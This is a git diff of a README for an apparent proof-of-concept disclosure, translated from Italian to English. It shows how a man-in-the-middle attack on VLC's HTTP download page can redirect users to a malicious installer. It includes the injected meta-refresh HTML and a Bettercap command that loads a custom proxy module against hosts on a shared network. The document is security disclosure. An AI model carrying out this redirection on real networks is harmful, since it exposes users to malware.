@@ -1,18 +1,14 @@
 # PoC Video
-
 https://www.youtube.com/watch?v=dhTAqCz7ktU
 
 # Man in The Middle
+VLC's official website, even having a valid SSL certificate, does not force users to use the HTTPS protocol. Major search engines have indexed VLC's website as HTTP so users are being redirected to the insecure version of the site.
 
-In computer security, a man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. {Wikipedia}
+According to the official stats, published by VLC founder, the software has been downloaded over 2.3 billion times: https://twitter.com/etixxx/status/881926077836398592
 
-Il sito internet ufficiale di VLC (videolan.org) nonostante sia dotato di un certificato SSL valido non veicola obbligatoriamente gli utenti ad utilizzare il protocollo HTTPS. Anche i principali motori di ricerca (Google, Bing, Yahoo) hanno indicizzato il sito senza HTTPS veicolando gli utenti sulla versione non sicura del sito internet.
+Through a "Man in The Middle" attack, it is possible to inject arbitrary HTML code on VLC's official website served over HTTP, deceiving the users to download an authentic installer file but actually redirecting them to a potentially malicious external resource which could deliver a malware-laced package. The attack is doable if both, the user and the attacker, are on the same network (i.e. public access point of an airport, hotel, etc.)
 
-Secondo le stime pubblicate dal fondatore di VLC il software è stato scariato oltre 2,3 miliardi di volte: https://twitter.com/etixxx/status/881926077836398592
-
-Tramite un attacco Man in The Middle è possibile pertanto iniettare codice HTML arbitrario nel sito ufficiale di VLC, in versione non HTTPS, illudendo l'utente di scaricare un file di installazione autentico ma realmente la vittima viene indirizzata ad una risorsa esterna che potrebbe contenere Malware. L'attacco MiM è possibile generarlo quando la vittima e l'attaccante si trovano nella stessa rete, un Access Point Wireless di un Aeroporto, Albergo e Bar sono tre comuni esempi.
-
-Il risultato dell'attacco è l'alterazione della pagina di download (es. http://get.videolan.org/vlc/2.2.6/win32/vlc-2.2.6-win32.exe) nella quale andremo a variare le seguenti porzioni di codice:
+The result of the attack is the alteration of the download page (i.e. http://get.videolan.org/vlc/2.2.6/win32/vlc-2.2.6-win32.exe) where we modify the following parts of code:
 
 ```html
 <meta http-equiv="refresh" content="5;URL='https://videolan.mirror.garr.it/mirrors/videolan/vlc/2.2.6/win32/vlc-2.2.6-win32.exe'" />
@@ -21,21 +17,20 @@ Il risultato dell'attacco è l'alterazione della pagina di download (es. http://
 ```
 
 # How To
+In order to effectively carry out the attack, we used Bettercap (https://www.bettercap.org/) and a custom Ruby module "exploit_vlc.rb" which is made publicly available on this repo.
 
-Per effettuare l'attacco sfruttiamo il software Bettercap (https://www.bettercap.org/) e un modulo Ruby scritto ad-hoc "exploit_vlc.rb" pubblicato anche esso in questa repository.
+The custom Ruby module contains the URL of the mirror, which we want the victim to point to, for downloading the VLC installer.
 
-All'interno del modulo personalizzato andremo a indicare il nuovo mirror del file eseguibile che vogliamo far scaricare alla vittima.
-
-Terminata questa personalizzazione avviamo Bettercap con i permessi di root, digitando da terminale:
+Once the module has been customised, Bettercap can be started using root privileges as shown below:
 
 $ sudo bettercap --proxy-module exploit_vlc.rb
 
-Eventualmente è possibile indicare uno specifico target con il parametro -T e l'interfaccia di rete con il paramentro -I. Se non viene specificato alcun target tutti gli host collegati alla rete potrebbero essere dei possibili target.
+Eventually, it would be possible to use a specific target calling the -T option and the network interface with the -I one. If no target is specified, all connected hosts of the network could become a potential target.
 
 # Credits
 * Fabio (Naif) Pietrosanti 
 * Andrea (Drego) Draghetti
+* Eddy (mane) Boscolo
 
 # Disclaimer 
-
-La tecnica illustrata è puramente a scopo divulgativo, può inoltre essere sfruttata su qualsiasi sito internet che diffonde software. L'attenzione nostra è ricaduta su VLC poichè è un software di grande interesse come ci ha anche affermato lo sviluppatore principale.
+All of provided information in this article is for educational purposes only. You accept full responsibility for the consequences of your use, or non-use, of any information provided by us through any means whatsoever.
